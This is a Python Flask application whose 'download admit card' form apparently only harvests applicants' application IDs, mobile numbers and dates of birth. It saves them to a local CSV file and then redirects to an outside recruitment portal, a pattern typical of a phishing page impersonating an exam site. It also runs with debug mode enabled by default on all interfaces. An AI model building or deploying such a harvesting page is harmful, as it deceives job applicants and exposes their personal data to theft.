import os
from flask import Flask, render_template, request, jsonify, session
import csv
from datetime import datetime
import secrets

app = Flask(__name__)

# Use environment variable for production or fallback to generated key
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(16))


# Generate CSRF token
def generate_csrf_token():
    if "_csrf_token" not in session:
        session["_csrf_token"] = secrets.token_hex(16)
    return session["_csrf_token"]


# Route to serve the main page
@app.route("/")
def index():
    csrf_token = generate_csrf_token()
    return render_template("index.html", csrf_token=csrf_token)


@app.route("/download-admit-card", methods=["POST"])
def download_admit_card():
    try:
        # Verify CSRF token
        token = session.pop("_csrf_token", None)
        if not token or token != request.form.get("_token"):
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403

        # Get form data
        application_id = request.form.get("application_id", "").strip()
        mobile_number = request.form.get("mobile_number", "").strip()
        dob = request.form.get("dob", "").strip()

        # Basic validation
        if not application_id or not mobile_number or not dob:
            return (
                jsonify(
                    {
                        "status": "error",
                        "message": "All fields are required. Please enter your credentials correctly.",
                    }
                ),
                422,
            )

        # Validate mobile number format (basic validation)
        if not mobile_number.isdigit() or len(mobile_number) < 10:
            return (
                jsonify(
                    {
                        "status": "error",
                        "message": "Please enter a valid 10-digit mobile number.",
                    }
                ),
                422,
            )

        # Get current timestamp
        timestamp = datetime.now().isoformat()

        # Ensure data directory exists
        data_dir = os.path.join(os.path.dirname(__file__), "data")
        if not os.path.exists(data_dir):
            os.makedirs(data_dir)

        csv_path = os.path.join(data_dir, "form_data.csv")

        # Append to CSV
        with open(csv_path, "a", newline="", encoding="utf-8") as csv_file:
            field_names = [
                "timestamp",
                "application_id",
                "mobile_number",
                "dob",
            ]
            csv_writer = csv.DictWriter(csv_file, fieldnames=field_names)

            # Check if file is empty to write header
            if csv_file.tell() == 0:
                csv_writer.writeheader()

            csv_writer.writerow(
                {
                    "timestamp": timestamp,
                    "application_id": application_id,
                    "mobile_number": mobile_number,
                    "dob": dob,
                }
            )

        # Return success response with redirect URL
        return jsonify(
            {
                "status": "success",
                "message": "Data saved successfully! Redirecting to BLAS portal...",
                "redirect_url": "https://badv523.blasrecruit.in/",
            }
        )
    except Exception as e:
        return (
            jsonify(
                {
                    "status": "error",
                    "message": "Something went wrong. Please try again and ensure all credentials are entered correctly.",
                }
            ),
            500,
        )


if __name__ == "__main__":
    # Initialize CSV file for development
    data_dir = os.path.join(os.path.dirname(__file__), "data")
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)

    csv_path = os.path.join(data_dir, "form_data.csv")

    try:
        with open(csv_path, "x", newline="", encoding="utf-8") as csv_file:
            field_names = [
                "timestamp",
                "application_id",
                "mobile_number",
                "dob",
            ]
            csv_writer = csv.DictWriter(csv_file, fieldnames=field_names)
            csv_writer.writeheader()
    except FileExistsError:
        pass

    # Run in debug mode for development only
    debug_mode = os.environ.get("FLASK_ENV") != "production"
    app.run(debug=debug_mode, host="0.0.0.0", port=5000)
